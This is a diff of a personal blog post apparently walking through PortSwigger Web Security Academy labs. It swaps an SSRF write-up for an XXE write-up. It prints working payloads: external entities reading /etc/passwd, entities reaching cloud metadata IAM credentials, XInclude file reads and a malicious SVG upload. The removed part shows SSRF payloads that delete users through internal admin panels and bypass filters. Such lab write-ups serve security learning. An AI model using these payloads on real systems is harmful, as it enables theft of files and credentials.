@@ -26,7 +26,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>SSRF - Web Sec academy labs</title>
+    <title>XML external entity - Web Sec academy labs</title>
     <style>
       :root {
         --text-color: #333;
@@ -258,41 +258,89 @@
 
     <div class="post-container">
       <article class="post">
-        <h1 class="post-title">SSRF - Web Sec academy labs</h1>
-        <p class="post-meta">Posted on March 1, 2025</p>
+        <h1 class="post-title">XML external entity - Web Sec academy labs</h1>
+        <p class="post-meta">Posted on May 24, 2025</p>
         
         <div class="post-content">
-          <p>This post will run through the labs on web sec academy by Portswigger related to SSRF.</p>
+          <p>This post will run through the labs on web sec academy by Portswigger related to XML external entity.</p>
 
-<p>Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.</p>
+<p>XML is a language designed for storing and transporting data. The XML document type definition (DTD) contains declarations that can define the structure of an XML document, the types of data values it can contain, and other items. XML allows custom entities to be defined within the DTD. XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.</p>
 
-<h3 id="lab-basic-ssrf-against-the-local-server"><u>Lab: Basic SSRF against the local server</u></h3>
-<p>In an SSRF attack against the server, the attacker causes the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. By having the local machine send the request we can bypass access controls since the local machine is usually trusted.</p>
+<h3 id="lab-exploiting-xxe-using-external-entities-to-retrieve-files"><u>Lab: Exploiting XXE using external entities to retrieve files</u></h3>
+<p>In this lab when we try to do a stock check for an item it sends a post request:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /product/stock HTTP/2
+Host: 0a2700480350c46a80b76cd700fa0080.web-security-academy.net
+Cookie: session=iu63PFnHTuz2RjVtdRCgLcgWBpMj3GbW
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a2700480350c46a80b76cd700fa0080.web-security-academy.net/product?productId=1
+Content-Type: application/xml
+Content-Length: 107
+Origin: https://0a2700480350c46a80b76cd700fa0080.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
 
-<p>For example in this lab there is a stock check feature where it makes an API call which is sent in the HTTP request. We can modify where it makes the API call to “http://localhost/admin” which gives us access to the admin panel where we see we can delete the user carlos through this call “/admin/delete?username=carlos”. Now by changing the API call to that we can delete carlos.</p>
-
-<h3 id="lab-basic-ssrf-against-another-back-end-system"><u>Lab: Basic SSRF against another back-end system</u></h3>
-<p>This lab is similar to the last but this time we are told the admin panel can be searched for in the range 192.168.0.X in the port 8080. So we can use burp intruder to go through all X from 1 to 255 to see which gives us a status code of 200.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stockApi=http://192.168.0.~:8080/admin
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
 </code></pre></div></div>
-<p>I found it to be at 39 and so by sending the request with this API url we can delete carlos: http://192.168.0.39:8080/admin/delete?username=carlos</p>
-
-<h3 id="lab-ssrf-with-blacklist-based-input-filter"><u>Lab: SSRF with blacklist-based input filter</u></h3>
-<p>In this lab there is a filter on the url we send for example it catches if we use localhost or admin within the url. To bypass this we can first use 127.1 instead of 127.0.0.1 and localhost and then we can also obfuscate the word admin through url encoding. However one url encoding is not enough to bypass the filter so we will double encode admin and then we have bypassed the filter.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.1/&lt;@urlencode_all&gt;&lt;@urlencode_all&gt;admin&lt;/@urlencode_all&gt;&lt;/@urlencode_all&gt;/delete?username=carlos
+<p>As you can see it uses XML so we can try create an external entity which will return the contents of the file we want. We would have to modifiy the the request so that the XML is;</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;
 </code></pre></div></div>
 
-<h3 id="lab-ssrf-with-filter-bypass-via-open-redirection-vulnerability"><u>Lab: SSRF with filter bypass via open redirection vulnerability</u></h3>
-<p>Other applications only allows urls which match whitelisted values which can be bypassed through inconsistent url parsing. If the API used to make the back-end HTTP request supports redirections, you can construct a URL that satisfies the filter and results in a redirected request to the desired back-end target. For example:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /product/stock HTTP/1.0
+<h3 id="lab-exploiting-xxe-to-perform-ssrf-attacks"><u>Lab: Exploiting XXE to perform SSRF attacks</u></h3>
+<p>For this lab we will have the same set up as last lab except we are trying to make a request to “http://169.254.169.254” so our external entity will be:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254"&gt; ]&gt;
+</code></pre></div></div>
+<p>When we send this request we get a an error “Invalid product ID: latest”, which means it is returning us latest which is actually part of the endpoint to access instance metadata properties from within a running instance. So we then add “lastest/meta-data”.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"&gt; ]&gt;
+</code></pre></div></div>
+<p>Using this we get the error “Invalid product ID: iam” so then we can add iam to the request as well until we get to the end which is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"&gt; ]&gt;
+</code></pre></div></div>
+
+<h3 id="lab-exploiting-xinclude-to-retrieve-files"><u>Lab: Exploiting XInclude to retrieve files</u></h3>
+<p>Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. In this situation, you cannot carry out a classic XXE attack, because you don’t control the entire XML document and so cannot define or modify a DOCTYPE element. However, you might be able to use XInclude instead. When we try to check the stock this POST request is sent:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /product/stock HTTP/2
+Host: 0a0000420309443f81333eef00720074.web-security-academy.net
+Cookie: session=P7GAkzfB4BFYXas3NSNxVWLA9YYMp3gv
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a0000420309443f81333eef00720074.web-security-academy.net/product?productId=1
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 118
+Content-Length: 21
+Origin: https://0a0000420309443f81333eef00720074.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Te: trailers
 
-stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin
+productId=1&amp;storeId=1
 </code></pre></div></div>
-<p>In this lab since the stock check feature takes a path we can give it our own url since it would just append it to the already existing url. Instead we have to find an open redirect which we find in the next product feature since it takes path as parameter. By giving the url to the next product feature with the redirect set to the admin panel, to stock check we can get access to the admin panel and delete the user carlos.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stockApi=/product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos
+<p>By injecting the below XML we are able to retrieve the contents of etc/passwd</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;
+&lt;/foo&gt;
 </code></pre></div></div>
+
+<h3 id="lab-exploiting-xxe-via-image-file-upload"><u>Lab: Exploiting XXE via image file upload</u></h3>
+<p>In some applications you can upload files and there are some common file types which are XML format like DOCX and SVG. Since in this lab we can upload images as our avatar in the comment section we can upload malicous SVG file that contains XML.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt; ]&gt;
+&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"&gt;
+    &lt;text x="10" y="20" font="16"&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;
+</code></pre></div></div>
+<p>Uploading this file we can access and display the contents of the file we want since it creates a external entity which accesses the file and then we display this in our SVG as text.</p>
 
         </div>
         
